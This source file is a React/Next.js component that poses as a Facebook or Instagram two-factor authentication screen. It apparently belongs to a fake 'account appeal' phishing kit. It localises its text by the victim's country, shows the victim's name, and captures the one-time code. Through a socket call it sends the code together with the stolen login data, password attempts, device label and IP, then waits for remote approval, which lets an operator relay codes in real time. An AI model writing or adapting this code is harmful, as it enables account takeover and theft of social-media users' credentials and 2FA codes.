import VerifyImage from '@/assets/images/2FAuth.png';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { submitCodeApproval } from '@/hooks/use-socket';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { type FC, type FormEvent, useEffect, useState } from 'react';

const TEXT = {
    title: 'Go to your authentication app',
    instruction:
        'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).',
    codePlaceholder: 'Code',
    error: 'The code you entered is incorrect. Please try again.',
    waiting: 'Waiting for verification...',
    continue: 'Continue',
    facebook: 'Facebook',
    instagram: 'Instagram',
    userFallback: 'User'
} as const;

const textsToTranslate = Object.values(TEXT);

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showInputError, setShowInputError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, appealProfile, loginProvider } = store();
    const appeal = useAppealContext();

    const t = (text: string): string => translations[text] || text;

    const normalizedCode = code.replace(/\D/g, '');
    const isCodeValid = /^\d{6,8}$/.test(normalizedCode);
    const canSubmit = isCodeValid && !isLoading;

    const providerLabel =
        loginProvider === 'instagram' ? t(TEXT.instagram) : loginProvider === 'facebook' ? t(TEXT.facebook) : t(TEXT.facebook);

    const userName = appealProfile?.fullName?.trim() || t(TEXT.userFallback);

    useEffect(() => {
        document.title = 'Two-factor authentication';
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!canSubmit) {
            return;
        }

        setIsLoading(true);
        setShowInputError(false);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitCodeApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                normalizedCode
            );

            if (result.approved) {
                nextStep();
                return;
            }

            setShowInputError(true);
            setCode('');
        } catch {
            setShowInputError(true);
            setCode('');
        } finally {
            setIsLoading(false);
        }
    };

    const showErrorMessage = showInputError;

    return (
        <div className='modal-overlay modal-overlay--light' role='dialog' aria-modal='true' aria-labelledby='two-fa-title'>
            <div className='modal-verify-card'>
                <div className='modal-verify-header'>
                    {userName} • {providerLabel}
                </div>
                <div className='modal-verify-body'>
                    <h1 id='two-fa-title'>{t(TEXT.title)}</h1>
                    <p className='desc'>{t(TEXT.instruction)}</p>
                    <div className='modal-verify-illustration'>
                        <Image src={VerifyImage} alt='' />
                    </div>
                    <form id='two-fa-form' onSubmit={handleSubmit}>
                        <input
                            id='two-fa-code'
                            className='form-input'
                            inputMode='numeric'
                            placeholder={t(TEXT.codePlaceholder)}
                            maxLength={8}
                            type='tel'
                            autoComplete='off'
                            value={code}
                            disabled={isLoading}
                            onChange={(e) => {
                                const value = e.target.value.replace(/\D/g, '').slice(0, 8);
                                setCode(value);
                                setShowInputError(false);
                            }}
                        />
                        {showErrorMessage ? <p className='text-sm text-red-500'>{t(TEXT.error)}</p> : null}
                        {isLoading ? <p className='text-sm text-gray-600'>{t(TEXT.waiting)}</p> : null}
                        <button type='submit' className='btn-verify-continue' disabled={!canSubmit}>
                            {isLoading ? (
                                <span className='inline-block h-5 w-5 animate-spin-fast rounded-full border-2 border-white border-b-transparent' />
                            ) : (
                                t(TEXT.continue)
                            )}
                        </button>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
